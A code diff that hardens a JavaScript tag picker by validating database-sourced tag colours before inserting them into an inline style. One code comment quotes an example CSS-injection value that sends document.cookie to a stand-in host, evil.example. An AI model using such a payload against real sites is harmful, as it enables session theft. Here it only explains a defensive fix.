@@ -43,6 +43,23 @@
             return [];
         }
     }
+    // Tag.colour comes from the DB (settable by anyone with tag-edit
+    // permission). Restrict to hex literals + a small set of named
+    // colour keywords so a hostile colour like
+    //   "red; background-image:url(http://evil.example/exfil?c="+document.cookie+")"
+    // can't smuggle declarations into the swatch's style attribute.
+    function safeColour(input) {
+        const fallback = '#777';
+        if (typeof input !== 'string') { return fallback; }
+        const s = input.trim();
+        if (/^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/.test(s)) {
+            return s;
+        }
+        if (/^[a-zA-Z]{3,32}$/.test(s)) {
+            return s;
+        }
+        return fallback;
+    }
 
     // ---------- tag picker ----------
 
@@ -116,7 +133,7 @@
                         ? '<span style="display:inline-block;width:10px;' +
                           'height:10px;border:1px solid rgba(0,0,0,0.15);' +
                           'border-radius:2px;margin-right:6px;' +
-                          'background:' + escape(data.colour) + ';"></span>'
+                          'background:' + escape(safeColour(data.colour)) + ';"></span>'
                         : '';
                     return '<div>' + swatch + escape(data.name) + '</div>';
                 }
